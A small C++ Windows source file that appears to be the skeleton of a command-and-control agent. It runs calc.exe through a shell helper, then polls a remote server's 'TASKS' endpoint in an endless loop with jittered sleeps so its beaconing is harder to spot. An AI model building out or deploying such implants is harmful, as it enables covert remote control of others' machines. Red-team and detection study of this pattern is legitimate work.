#include <iostream>
#include <string>
#include <windows.h>
#include <random>
#include "shell.h"
#include "network_operations.h"
#include "agent.h"

int getRandom(int min, int max) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(min, max);
    return dis(gen);
}

int main() {
    agent fern;

    const std::string cmd = "calc.exe";
    std::string output = shell(cmd);

    std::cout << "Output:" << output << "\n";

    std::string ip{fern.getip()};
    std::string uri = {TASKS};
    unsigned int port{fern.getport()};

    while (true) {

        std::string response{get(ip, port, uri)};

        std::cout << response << "\n";
        int jitter = getRandom(-2500, 5000);
        Sleep(fern.getSleep() + jitter);
    }
}
